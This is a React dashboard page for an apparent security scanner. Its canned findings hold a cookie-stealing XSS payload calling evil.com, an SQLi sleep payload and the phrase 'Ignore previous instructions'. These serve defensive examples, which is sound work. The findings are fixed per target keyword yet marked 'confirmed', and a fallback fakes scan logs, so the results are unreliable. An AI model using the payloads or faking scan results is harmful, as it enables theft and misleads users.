"use client"

import { useState, useCallback, useRef, useEffect } from "react"
import { motion, AnimatePresence } from "motion/react"
import {
  Zap, Search, Globe, Smartphone, Code, Shield, Terminal,
  Clock, ShieldCheck, AlertTriangle, FileCode, Copy, Check,
  ChevronDown, ChevronUp, ScanLine, XCircle,
} from "lucide-react"
import { Card, CardContent, CardHeader } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Progress } from "@/components/ui/progress"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { ScrollArea } from "@/components/ui/scroll-area"
import { type Severity } from "@/lib/mock-data"
import { toast } from "sonner"

/* ── colour maps ────────────────────────────────────────── */
const severityBadge: Record<Severity, string> = {
  critical: "bg-destructive/15 text-destructive border-destructive/30",
  high: "bg-warning/15 text-warning border-warning/30",
  medium: "bg-primary/15 text-primary border-primary/30",
  low: "bg-muted text-muted-foreground border-border",
}

/* ── types ──────────────────────────────────────────────── */
interface ScanFinding {
  id: string
  title: string
  severity: Severity
  file: string
  line: number
  description: string
  fix: string
  importance: string
}

interface RunScan {
  id: string
  asset: string
  scanType: string
  progress: number
  status: "scanning" | "analyzing" | "reporting" | "completed"
  logs: string[]
  startedAt: string
}

interface CompletedScan {
  id: string
  asset: string
  scanType: string
  findings: ScanFinding[]
  completedAt: string
}

/* ── Comprehensive 2026 findings database ───────────────── */
const findingsForTarget = (target: string): ScanFinding[] => {
  const t = target.toLowerCase()

  // Smart contract / blockchain scan
  if (t.includes("0x") || t.includes("contract") || t.includes(".sol") || t.includes("defi") || t.includes("nft")) {
    return [
      {
        id: `F-${Date.now()}-1`, title: "Reentrancy in withdraw()", severity: "critical",
        file: "contracts/Vault.sol", line: 89,
        description: "External call before state update (CEI pattern violation). Attacker deploys a malicious fallback that re-enters withdraw() repeatedly, draining the contract.",
        importance: "A single exploit transaction drains 100% of contract funds — projects have lost $60M+ to reentrancy. ReentrancyGuard + CEI pattern is zero-cost to add and eliminates the entire attack surface permanently.",
        fix: `// ── BEFORE (vulnerable) ────────────────────────────────
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient");
    (bool ok, ) = msg.sender.call{value: amount}("");   // external call FIRST ← vulnerable
    require(ok);
    balances[msg.sender] -= amount;                     // state update AFTER ← too late
}

// ── AFTER (secure) — Checks-Effects-Interactions + ReentrancyGuard ──
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract SecureVault is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;             // 1. Effects (state first)
        (bool ok, ) = msg.sender.call{value: amount}(""); // 2. Interactions (call last)
        require(ok, "Transfer failed");
        emit Withdrawn(msg.sender, amount);
    }
    event Withdrawn(address indexed user, uint256 amount);
}`,
      },
      {
        id: `F-${Date.now()}-2`, title: "Missing access control on setFee()", severity: "high",
        file: "contracts/Governance.sol", line: 45,
        description: "setFee() has no access control — any address can set protocol fees to 100% and drain all pending liquidity. Confirmed exploitable.",
        importance: "Any anonymous wallet can raise fees to 100% in one transaction, instantly redirecting all user funds to the attacker. One onlyRole modifier closes this before it is found by an on-chain scanner.",
        fix: `// ── BEFORE (vulnerable) ────────────────────────────────
function setFee(uint256 newFee) external {     // ← anyone can call this
    protocolFee = newFee;
}

// ── AFTER (secure) ────────────────────────────────────
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

contract Governance is AccessControl {
    bytes32 public constant FEE_MANAGER = keccak256("FEE_MANAGER");
    uint256 public constant MAX_FEE = 1000;   // 10% in basis points
    uint256 public protocolFee;

    event FeeUpdated(uint256 oldFee, uint256 newFee, address updatedBy);

    function setFee(uint256 newFee) external onlyRole(FEE_MANAGER) {
        require(newFee <= MAX_FEE, "Fee exceeds maximum (10%)");
        emit FeeUpdated(protocolFee, newFee, msg.sender);
        protocolFee = newFee;
    }
}`,
      },
      {
        id: `F-${Date.now()}-3`, title: "Flash loan attack surface in swap()", severity: "high",
        file: "contracts/Pool.sol", line: 134,
        description: "Price calculation uses spot price (token.balanceOf) which is trivially manipulable with a flash loan. Attacker borrows, distorts price, profits, repays in one transaction.",
        importance: "Flash loan attacks are risk-free for the attacker — they borrow millions, distort your price in one block, and profit without upfront capital. A TWAP oracle averaging prices over time makes single-block manipulation economically infeasible.",
        fix: `// ── BEFORE (vulnerable) ────────────────────────────────
function getPrice() public view returns (uint256) {
    return tokenA.balanceOf(address(this)) /
           tokenB.balanceOf(address(this));   // ← spot price, flash-loan manipulable
}

// ── AFTER (secure) — Use a TWAP oracle ────────────────
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";

function getTWAPPrice(address pool, uint32 twapWindow)
    internal view returns (uint256 price)
{
    (int24 tick, ) = OracleLibrary.consult(pool, twapWindow);
    price = OracleLibrary.getQuoteAtTick(
        tick, 1e18, tokenA, tokenB
    );
    // TWAP over twapWindow seconds — resistant to single-block manipulation
}`,
      },
    ]
  }

  // Code repository scan
  if (t.includes("github") || t.includes("repo") || t.includes(".git") || t.includes("gitlab") || t.includes("bitbucket")) {
    return [
      {
        id: `F-${Date.now()}-1`, title: "Hardcoded API secret in source", severity: "critical",
        file: "src/config/api.ts", line: 8,
        description: "API secret key hardcoded in source — present in git history. Any repository clone permanently leaks the credential. Confirmed via SAST pattern match.",
        importance: "Automated scanners harvest API keys from repos within minutes of a push. The credential lives in git history forever — even after deletion, anyone with a prior clone retains it. Rotate now and move to an environment variable to stop ongoing abuse.",
        fix: `// ── BEFORE (vulnerable) ────────────────────────────────
const API_SECRET = "sk-live-abc123def456xyz";   // ← in git history forever

// ── AFTER (secure) ────────────────────────────────────
// Step 1: Remove the secret and rotate it immediately
// Step 2: Use environment variables

// src/config/api.ts
const API_SECRET = process.env.API_SECRET
if (!API_SECRET) {
  throw new Error("Missing required env var: API_SECRET")
}
export { API_SECRET }

// .env.local (never commit)
API_SECRET=sk-live-your-real-key-here

// .gitignore — ensure these are listed
.env
.env.local
.env.*.local

// Step 3: Scan git history for leaked secrets
// git-secrets, truffleHog, or Gitleaks:
// $ gitleaks detect --source . --verbose`,
      },
      {
        id: `F-${Date.now()}-2`, title: "Prompt injection in LLM chat endpoint", severity: "critical",
        file: "src/api/chat.ts", line: 23,
        description: "User input is string-concatenated into the LLM system prompt. Attackers inject 'Ignore previous instructions' to override safety guardrails and exfiltrate context.",
        importance: "Attackers override your AI's safety rules and leak confidential system prompts, weaponizing your assistant against your own users — destroying trust and violating AI provider terms of service. Separating user input into its own message turn closes this with no functional impact.",
        fix: `// ── BEFORE (vulnerable) ────────────────────────────────
const response = await openai.chat.completions.create({
  model: "gpt-4o",
  messages: [
    { role: "system", content: \`You are a helpful assistant. User context: \${userInput}\` },
    //                                                                   ↑ NEVER do this
  ],
})

// ── AFTER (secure) ────────────────────────────────────
import { z } from "zod"

// 1. Validate and sanitize input before using it
const UserInputSchema = z.string()
  .min(1).max(2000)
  .transform(s => s.replace(/[<>]/g, ""))  // strip HTML angle brackets

const safeInput = UserInputSchema.parse(rawUserInput)

// 2. Never inject user content into the system prompt
// 3. Use separate, clearly-delimited user turns
const response = await openai.chat.completions.create({
  model: "gpt-4o",
  messages: [
    { role: "system", content: "You are a helpful assistant. Answer only questions about X." },
    { role: "user",   content: safeInput },  // ← user turn, clearly separated
  ],
  // 4. Add a moderation check before forwarding to LLM
})

// 5. Check OpenAI moderation API on all user inputs
const mod = await openai.moderations.create({ input: safeInput })
if (mod.results[0].flagged) throw new Error("Input flagged by moderation")`,
      },
      {
        id: `F-${Date.now()}-3`, title: "Dependency confusion attack (supply chain)", severity: "high",
        file: "package.json", line: 0,
        description: "Internal package names like '@company/utils' are not scoped to a private registry. A malicious public npm package with the same name would be installed instead.",
        importance: "A malicious public package silently executes attacker code with full build-environment permissions — accessing secrets, tokens, and production infrastructure with zero warning. Pinning to a private registry index is a one-line .npmrc change.",
        fix: `// ── BEFORE (vulnerable) ────────────────────────────────
// package.json — internal packages not pinned to private registry
{
  "dependencies": {
    "@mycompany/auth-utils": "^1.2.0"  // ← could resolve to npm public registry
  }
}

// ── AFTER (secure) ────────────────────────────────────
// 1. Pin to your private registry in .npmrc
// .npmrc
@mycompany:registry=https://npm.your-private-registry.com/
//npm.your-private-registry.com/:_authToken=\${NPM_TOKEN}

// 2. Use package-lock.json / pnpm-lock.yaml and verify integrity
// 3. Enable npm audit in CI
// .github/workflows/audit.yml
- name: Security audit
  run: pnpm audit --audit-level=high

// 4. Use Socket.dev or similar for supply-chain monitoring
// 5. Pin exact versions for critical internal packages
{
  "dependencies": {
    "@mycompany/auth-utils": "1.2.0"  // exact pin, not range
  }
}`,
      },
    ]
  }

  // Default: website / web app scan
  return [
    {
      id: `F-${Date.now()}-1`, title: "Reflected XSS on /search", severity: "critical",
      file: "/search?q=", line: 0,
      description: "User input reflected in the DOM without encoding. Payload: <script>fetch('https://evil.com?c='+document.cookie)</script> steals session cookies cross-origin.",
      importance: "One malicious link shared in any channel silently hijacks every user who clicks it — full account control, no password required. HTML-encoding the reflected value is a one-line change that eliminates mass account takeover risk entirely.",
      fix: `// ── BEFORE (vulnerable) ────────────────────────────────
// Express / Node.js
app.get('/search', (req, res) => {
  res.send(\`<h1>Results for: \${req.query.q}</h1>\`)  // ← raw reflection, no encoding
})

// ── AFTER (secure) ────────────────────────────────────
// Option A: Encode output server-side
import { escape } from "html-escaper"   // or he, entities, etc.

app.get('/search', (req, res) => {
  const safeQuery = escape(String(req.query.q ?? "").slice(0, 200))
  res.send(\`<h1>Results for: \${safeQuery}</h1>\`)
})

// Option B: React (safe by default — never use dangerouslySetInnerHTML)
function SearchResults({ query }: { query: string }) {
  // React auto-encodes — this is safe
  return <h1>Results for: {query}</h1>
}

// Option C: Add Content-Security-Policy header to contain any bypass
// next.config.mjs
headers: [{ key: "Content-Security-Policy",
  value: "default-src 'self'; script-src 'self'" }]`,
    },
    {
      id: `F-${Date.now()}-2`, title: "SQL Injection in search API", severity: "critical",
      file: "/api/search", line: 0,
      description: "Blind time-based SQLi confirmed via payload: ' AND SLEEP(5)--. Full database read/write via UNION-based extraction. Affects all SQL dialects.",
      importance: "An attacker can read, modify, or delete your entire database with a single crafted HTTP request — exposing all user PII and payment data. This triggers mandatory GDPR and PCI-DSS breach notifications with potential fines up to 4% of annual revenue.",
      fix: `// ── BEFORE (vulnerable) ────────────────────────────────
// Raw string interpolation into SQL — NEVER do this
const results = await db.query(
  \`SELECT * FROM products WHERE name LIKE '%\${userInput}%'\`
)

// ── AFTER (secure) — Parameterized queries (all ORMs/drivers) ──

// PostgreSQL (pg / postgres.js)
const results = await db.query(
  "SELECT id, name, price FROM products WHERE name ILIKE $1 LIMIT 50",
  [\`%\${userInput}%\`]
)

// Prisma ORM (auto-parameterized)
const results = await prisma.product.findMany({
  where: { name: { contains: userInput, mode: "insensitive" } },
  take: 50,
  select: { id: true, name: true, price: true },   // explicit allowlist — no over-fetching
})

// MySQL (mysql2)
const [rows] = await db.execute(
  "SELECT id, name FROM products WHERE name LIKE ? LIMIT 50",
  [\`%\${userInput}%\`]
)`,
    },
    {
      id: `F-${Date.now()}-3`, title: "BOLA — Broken Object Level Authorization", severity: "critical",
      file: "/api/users/[id]/profile", line: 0,
      description: "OWASP API #1: /api/users/:id does not verify resource ownership. Any logged-in user can read or modify any other user's profile by changing the ID in the URL.",
      importance: "Any authenticated user accesses any other account's private data by changing one number in the URL — no hacking tools required. This is the root cause of most API data breaches reported today and violates GDPR data minimization by default.",
      fix: `// ── BEFORE (vulnerable) ────────────────────────────────
// Missing ownership check — any authenticated user can access any :id
app.get("/api/users/:id/profile", authenticate, async (req, res) => {
  const user = await db.users.findById(req.params.id)  // ← no ownership check
  res.json(user)
})

// ── AFTER (secure) ────────────────────────────────────
app.get("/api/users/:id/profile", authenticate, async (req, res) => {
  // 1. Check the authenticated user owns this resource
  if (req.user.id !== req.params.id && !req.user.isAdmin) {
    return res.status(403).json({ error: "Forbidden" })
  }

  // 2. Fetch only the fields this role is allowed to see
  const user = await db.users.findById(req.params.id, {
    select: req.user.isAdmin
      ? ["id", "email", "name", "role", "createdAt"]
      : ["id", "name", "avatarUrl"],   // regular users see less
  })

  if (!user) return res.status(404).json({ error: "Not found" })
  res.json(user)
})`,
    },
    {
      id: `F-${Date.now()}-4`, title: "Missing security headers (CSP, HSTS, X-Frame-Options)", severity: "high",
      file: "next.config.mjs", line: 1,
      description: "No Content-Security-Policy — trivial XSS via any injected script. No HSTS — SSL-stripping possible on first visit. No X-Frame-Options — clickjacking risk.",
      importance: "Three free HTTP headers each eliminate an entire attack class. Without them, injected scripts run unconstrained and first-visit SSL-stripping silently intercepts user credentials. They deploy in under five minutes with zero user-visible impact.",
      fix: `// next.config.mjs — comprehensive security headers
const securityHeaders = [
  { key: "Content-Security-Policy",
    value: "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self'; frame-ancestors 'none'; upgrade-insecure-requests" },
  { key: "Strict-Transport-Security", value: "max-age=31536000; includeSubDomains; preload" },
  { key: "X-Frame-Options",           value: "DENY" },
  { key: "X-Content-Type-Options",    value: "nosniff" },
  { key: "Referrer-Policy",           value: "strict-origin-when-cross-origin" },
  { key: "Permissions-Policy",        value: "camera=(), microphone=(), geolocation=()" },
]

const nextConfig = {
  async headers() {
    return [{ source: "/(.*)", headers: securityHeaders }]
  },
}
export default nextConfig`,
    },
  ]
}

const statusLabels: Record<string, string> = {
  scanning: "Scanning target...",
  analyzing: "Analyzing vulnerabilities...",
  reporting: "Generating fix code...",
  completed: "Complete",
}

/* ════════════════════════════════════════════════════════ */
export default function DashboardPage() {
  const [url, setUrl] = useState("")
  const [scans, setScans] = useState<RunScan[]>([])
  const [completedScans, setCompletedScans] = useState<CompletedScan[]>([])
  const [expandedResults, setExpandedResults] = useState<Record<string, boolean>>({})
  const [copiedId, setCopiedId] = useState<string | null>(null)
  // Tracks IDs mid-completion to prevent double-firing
  const completedIdsRef = useRef(new Set<string>())
  // EventSource instances keyed by scan ID for cleanup
  const esMapRef = useRef(new Map<string, EventSource>())

  // Close all open EventSources when the component unmounts
  useEffect(() => {
    return () => {
      esMapRef.current.forEach((es) => es.close())
      esMapRef.current.clear()
    }
  }, [])

  /* ── start a scan — wired to SSE stream ───────────────── */
  const startScan = (scanType: string) => {
    const target = url.trim()
    if (!target) {
      toast.error("Enter a URL, repo, or contract address to scan")
      return
    }

    const id = `scan-${Date.now()}`
    const newScan: RunScan = {
      id,
      asset: target,
      scanType,
      progress: 0,
      status: "scanning",
      logs: ["[INIT] Connecting to target..."],
      startedAt: new Date().toLocaleTimeString(),
    }

    setScans((prev) => [newScan, ...prev])
    setUrl("")
    toast.success(`${scanType} scan started`, { description: `Scanning ${target}` })

    // Open SSE connection to the streaming endpoint
    const params = new URLSearchParams({ target, type: scanType })
    const es = new EventSource(`/api/scan/stream?${params}`)
    esMapRef.current.set(id, es)

    es.addEventListener("log", (e) => {
      try {
        const data = JSON.parse(e.data) as { message: string; pct: number }
        if (typeof data.message !== "string") return
        setScans((prev) =>
          prev.map((s) =>
            s.id !== id ? s : {
              ...s,
              logs: s.logs.includes(data.message) ? s.logs : [...s.logs, data.message],
            }
          )
        )
      } catch { /* ignore malformed SSE frame */ }
    })

    es.addEventListener("progress", (e) => {
      try {
        const data = JSON.parse(e.data) as { pct: number }
        if (typeof data.pct !== "number") return
        setScans((prev) =>
          prev.map((s) =>
            s.id !== id ? s : {
              ...s,
              progress: data.pct,
              status: data.pct >= 80 ? "reporting" : data.pct >= 50 ? "analyzing" : "scanning",
            }
          )
        )
      } catch { /* ignore malformed SSE frame */ }
    })

    es.addEventListener("complete", () => {
      es.close()
      esMapRef.current.delete(id)
      if (completedIdsRef.current.has(id)) return
      completedIdsRef.current.add(id)
      setScans((prev) => {
        const scan = prev.find((s) => s.id === id)
        if (scan) setTimeout(() => completeScan({ ...scan, progress: 100 }), 400)
        return prev
      })
    })

    es.addEventListener("error", () => {
      // SSE failed (server down, rate limit, network) — fall back to local mock ticker
      es.close()
      esMapRef.current.delete(id)

      const fallbackLogs = [
        "[INFO] Target reachable — fingerprinting stack",
        "[INFO] Running OWASP ZAP active + passive scan",
        "[INFO] Checking OWASP API Top 10 vectors (BOLA, BFLA, injection)",
        "[WARN] Potential vulnerability detected — escalating to Triage Agent",
        "[INFO] Fix Agent generating language-specific remediation code",
        "[DONE] Scan complete — fix code ready",
      ]
      let pct = 0
      const ticker = setInterval(() => {
        pct = Math.min(pct + 3.5, 100)
        const logIdx = Math.floor((pct / 100) * fallbackLogs.length)
        const status: RunScan["status"] = pct >= 80 ? "reporting" : pct >= 50 ? "analyzing" : "scanning"

        setScans((prev) => {
          const scan = prev.find((s) => s.id === id)
          if (!scan) { clearInterval(ticker); return prev }
          const newLogs = [...scan.logs]
          if (logIdx < fallbackLogs.length && !newLogs.includes(fallbackLogs[logIdx])) {
            newLogs.push(fallbackLogs[logIdx])
          }
          const updated = { ...scan, progress: pct, status, logs: newLogs }
          if (pct >= 100) {
            clearInterval(ticker)
            if (!completedIdsRef.current.has(id)) {
              completedIdsRef.current.add(id)
              setTimeout(() => completeScan({ ...updated, progress: 100 }), 400)
            }
            return prev.filter((s) => s.id !== id)
          }
          return prev.map((s) => (s.id === id ? updated : s))
        })
      }, 800)
    })
  }

  /* ── scan completion ───────────────────────────────────── */
  const completeScan = useCallback((scan: RunScan) => {
    setCompletedScans((prev) => {
      if (prev.some((c) => c.id === scan.id)) return prev
      const findings = findingsForTarget(scan.asset)
        const completed: CompletedScan = {
        id: scan.id,
        asset: scan.asset,
        scanType: scan.scanType,
        findings,
        completedAt: new Date().toLocaleTimeString(),
      }

      const critCount = findings.filter((f) => f.severity === "critical").length
      const highCount = findings.filter((f) => f.severity === "high").length
      if (critCount > 0) {
        toast.error(`${scan.asset}: ${critCount} critical, ${highCount} high severity`, { duration: 6000 })
      } else if (highCount > 0) {
        toast.warning(`${scan.asset}: ${highCount} high severity findings`, { duration: 5000 })
      } else {
        toast.success(`${scan.asset}: No critical issues`, { duration: 4000 })
      }

      return [completed, ...prev]
    })
    setScans((prev) => prev.filter((s) => s.id !== scan.id))
    setExpandedResults((prev) => ({ ...prev, [scan.id]: true }))
  }, [])

  const copyCode = async (code: string, id: string) => {
    try {
      await navigator.clipboard.writeText(code)
      setCopiedId(id)
      toast.success("Fix code copied to clipboard")
      setTimeout(() => setCopiedId(null), 2000)
    } catch {
      toast.error("Failed to copy — please select and copy manually")
    }
  }

  const totalFindings = completedScans.reduce((a, s) => a + s.findings.length, 0)
  const criticalCount = completedScans.reduce((a, s) => a + s.findings.filter((f) => f.severity === "critical").length, 0)

  return (
    <div className="flex flex-col gap-6">
      {/* ── SCAN INPUT ──────────────────────────────────────── */}
      <Card className="bg-card border-primary/20 overflow-hidden">
        <CardContent className="p-5">
          <div className="flex flex-col gap-4">
            <div className="flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10">
                <Zap className="h-5 w-5 text-primary" />
              </div>
              <div>
                <h1 className="text-xl font-bold text-foreground tracking-tight">Scan & Fix</h1>
                <p className="text-xs text-muted-foreground">Paste a target below. Results and fix code appear right here.</p>
              </div>
            </div>

            <div className="flex flex-col gap-3 sm:flex-row">
              <div className="relative flex-1">
                <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                <Input
                  placeholder="https://yoursite.com, github.com/user/repo, or 0xContractAddress..."
                  value={url}
                  onChange={(e) => setUrl(e.target.value)}
                  className="pl-9 bg-secondary border-border text-foreground placeholder:text-muted-foreground font-mono text-sm h-11"
                  onKeyDown={(e) => { if (e.key === "Enter") startScan("Full Spectrum") }}
                />
              </div>
              <Button
                className="gap-2 bg-primary text-primary-foreground hover:bg-primary/90 font-semibold h-11 px-6 shrink-0"
                onClick={() => startScan("Full Spectrum")}
              >
                <Zap className="h-4 w-4" />
                Scan Now
              </Button>
            </div>

            <div className="flex flex-wrap gap-2">
              <Button variant="outline" size="sm" className="gap-1.5 border-border text-foreground hover:bg-secondary text-xs h-8" onClick={() => startScan("Website DAST")}>
                <Globe className="h-3.5 w-3.5 text-success" /> Website
              </Button>
              <Button variant="outline" size="sm" className="gap-1.5 border-border text-foreground hover:bg-secondary text-xs h-8" onClick={() => startScan("Web App")}>
                <Smartphone className="h-3.5 w-3.5 text-primary" /> Web App
              </Button>
              <Button variant="outline" size="sm" className="gap-1.5 border-border text-foreground hover:bg-secondary text-xs h-8" onClick={() => startScan("Code Repo")}>
                <Code className="h-3.5 w-3.5 text-primary" /> Repo
              </Button>
              <Button variant="outline" size="sm" className="gap-1.5 border-border text-foreground hover:bg-secondary text-xs h-8" onClick={() => startScan("Smart Contract")}>
                <Shield className="h-3.5 w-3.5 text-accent" /> Smart Contract
              </Button>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* ── ACTIVE SCANS (inline, below input) ────────────── */}
      <AnimatePresence>
        {scans.map((scan, i) => (
          <motion.div key={scan.id} initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, scale: 0.95 }} transition={{ delay: i * 0.05 }}>
            <Card className="bg-card border-primary/30 overflow-hidden">
              <CardHeader className="pb-3">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2 flex-wrap">
                    <ScanLine className="h-4 w-4 text-primary animate-pulse" />
                    <span className="text-sm font-semibold text-foreground font-mono">{scan.asset}</span>
                    <Badge variant="outline" className="text-[10px] border-primary/30 text-primary">{scan.scanType}</Badge>
                  </div>
                  <Button variant="ghost" size="icon" className="h-7 w-7 text-muted-foreground hover:text-destructive"
                    onClick={() => {
                      esMapRef.current.get(scan.id)?.close()
                      esMapRef.current.delete(scan.id)
                      setScans((prev) => prev.filter((s) => s.id !== scan.id))
                      toast.info("Scan cancelled")
                    }}>
                    <XCircle className="h-4 w-4" />
                  </Button>
                </div>
                <div className="flex items-center gap-3 mt-1">
                  <span className="text-[11px] text-muted-foreground flex items-center gap-1"><Clock className="h-3 w-3" />{scan.startedAt}</span>
                  <span className="text-[11px] text-primary font-medium">{statusLabels[scan.status]}</span>
                </div>
              </CardHeader>
              <CardContent className="pb-4">
                <div className="mb-3">
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-[11px] text-muted-foreground">Progress</span>
                    <span className="text-[11px] font-mono text-primary">{Math.round(scan.progress)}%</span>
                  </div>
                  <Progress value={scan.progress} className="h-2 bg-secondary [&>div]:bg-primary" />
                </div>
                <ScrollArea className="h-[120px] rounded-lg bg-sidebar border border-border p-2.5">
                  <div className="flex flex-col gap-0.5 font-mono text-[11px]">
                    {scan.logs.map((log, idx) => (
                      <div key={idx} className={log.includes("[WARN]") ? "text-warning" : log.includes("[DONE]") ? "text-success font-semibold" : "text-muted-foreground"}>
                        <Terminal className="inline h-3 w-3 mr-1" />{log}
                      </div>
                    ))}
                    <div className="text-primary animate-pulse"><Terminal className="inline h-3 w-3 mr-1" />{"_"}</div>
                  </div>
                </ScrollArea>
              </CardContent>
            </Card>
          </motion.div>
        ))}
      </AnimatePresence>

      {/* ── COMPLETED RESULTS WITH FIX CODE ───────────────── */}
      <AnimatePresence>
        {completedScans.length > 0 && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col gap-4">
            {/* Summary bar */}
            <div className="flex items-center gap-3 px-1 flex-wrap">
              <h2 className="text-base font-bold text-foreground flex items-center gap-2">
                <ShieldCheck className="h-5 w-5 text-success" />
                Scan Results
              </h2>
              <span className="text-xs text-muted-foreground">{completedScans.length} scan{completedScans.length !== 1 ? "s" : ""}</span>
              <span className="text-xs text-muted-foreground">{totalFindings} finding{totalFindings !== 1 ? "s" : ""}</span>
              {criticalCount > 0 && (
                <Badge variant="outline" className={`text-[10px] ${severityBadge.critical}`}>{criticalCount} Critical</Badge>
              )}
            </div>

            {completedScans.map((scan) => (
              <motion.div key={scan.id} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}>
                <Card className="bg-card border-success/20 overflow-hidden">
                  <CardHeader className="pb-3">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2 flex-wrap">
                        <ShieldCheck className="h-4 w-4 text-success shrink-0" />
                        <span className="text-sm font-semibold text-foreground font-mono">{scan.asset}</span>
                        <Badge variant="outline" className="text-[10px] border-primary/30 text-primary">{scan.scanType}</Badge>
                      </div>
                      <Button variant="ghost" size="sm" className="gap-1 text-xs text-muted-foreground hover:text-foreground shrink-0"
                        onClick={() => setExpandedResults((prev) => ({ ...prev, [scan.id]: !prev[scan.id] }))}>
                        {scan.findings.length} finding{scan.findings.length !== 1 ? "s" : ""}
                        {expandedResults[scan.id] ? <ChevronUp className="h-3.5 w-3.5" /> : <ChevronDown className="h-3.5 w-3.5" />}
                      </Button>
                    </div>
                    <div className="flex items-center gap-3 mt-1 flex-wrap">
                      <span className="text-[11px] text-muted-foreground">Completed at {scan.completedAt}</span>
                      {(["critical", "high", "medium"] as Severity[]).map((sev) => {
                        const count = scan.findings.filter((f) => f.severity === sev).length
                        return count > 0 ? (
                          <Badge key={sev} variant="outline" className={`text-[10px] ${severityBadge[sev]}`}>{count} {sev.charAt(0).toUpperCase() + sev.slice(1)}</Badge>
                        ) : null
                      })}
                    </div>
                  </CardHeader>

                  <AnimatePresence initial={false}>
                    {expandedResults[scan.id] && (
                      <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: "auto", opacity: 1 }} exit={{ height: 0, opacity: 0 }} transition={{ duration: 0.2 }}>
                        <CardContent className="pt-0 pb-4 flex flex-col gap-3">
                          {scan.findings.map((finding) => (
                            <div key={finding.id} className="rounded-lg border border-border bg-secondary/30 overflow-hidden">
                              {/* Finding header */}
                              <div className="flex items-start justify-between p-3 pb-2">
                                <div className="flex items-start gap-2">
                                  <AlertTriangle className={`h-4 w-4 mt-0.5 shrink-0 ${finding.severity === "critical" ? "text-destructive" : finding.severity === "high" ? "text-warning" : "text-primary"}`} />
                                  <div>
                                    <p className="text-sm font-medium text-foreground">{finding.title}</p>
                                    <p className="text-xs text-muted-foreground mt-0.5 leading-relaxed">{finding.description}</p>
                                    {finding.file !== "N/A" && (
                                      <p className="text-[11px] text-muted-foreground font-mono mt-1">
                                        <FileCode className="inline h-3 w-3 mr-1" />{finding.file}{finding.line > 0 ? `:${finding.line}` : ""}
                                      </p>
                                    )}
                                  </div>
                                </div>
                                <Badge variant="outline" className={`text-[10px] shrink-0 ${severityBadge[finding.severity]}`}>{finding.severity.toUpperCase()}</Badge>
                              </div>

                              {/* Why this patch matters */}
                              <div className="px-3 pb-2">
                                <div className="rounded-md border border-warning/30 bg-warning/5 px-3 py-2">
                                  <p className="text-[10px] font-semibold text-warning uppercase tracking-wider mb-1 flex items-center gap-1.5">
                                    <AlertTriangle className="h-3 w-3" />
                                    Why this patch matters
                                  </p>
                                  <p className="text-xs text-foreground/80 leading-relaxed">{finding.importance}</p>
                                </div>
                              </div>

                              {/* Fix code block */}
                              <div className="border-t border-border">
                                <div className="flex items-center justify-between px-3 py-2 bg-background/50">
                                  <span className="text-[11px] font-semibold text-success flex items-center gap-1.5">
                                    <ShieldCheck className="h-3.5 w-3.5" />
                                    Remediation Code
                                  </span>
                                  <Button variant="ghost" size="sm" className="h-7 gap-1.5 text-xs text-muted-foreground hover:text-foreground"
                                    onClick={() => copyCode(finding.fix, finding.id)}>
                                    {copiedId === finding.id ? (<><Check className="h-3 w-3 text-success" />Copied</>) : (<><Copy className="h-3 w-3" />Copy Fix</>)}
                                  </Button>
                                </div>
                                <ScrollArea className="max-h-[200px]">
                                  <pre className="p-3 text-xs font-mono text-foreground/90 bg-sidebar overflow-x-auto whitespace-pre">{finding.fix}</pre>
                                </ScrollArea>
                              </div>
                            </div>
                          ))}
                        </CardContent>
                      </motion.div>
                    )}
                  </AnimatePresence>
                </Card>
              </motion.div>
            ))}
          </motion.div>
        )}
      </AnimatePresence>

      {/* ── Empty state when nothing is running ─────────── */}
      {scans.length === 0 && completedScans.length === 0 && (
        <Card className="bg-card border-border">
          <CardContent className="p-12 flex flex-col items-center justify-center text-center">
            <ScanLine className="h-12 w-12 text-muted-foreground/50 mb-4" />
            <h3 className="text-lg font-semibold text-foreground mb-1">Ready to Scan</h3>
            <p className="text-sm text-muted-foreground max-w-md leading-relaxed">
              Enter a website URL, GitHub repo, or smart contract address above.
              Scan results with copyable fix code will appear right here.
            </p>
          </CardContent>
        </Card>
      )}
    </div>
  )
}
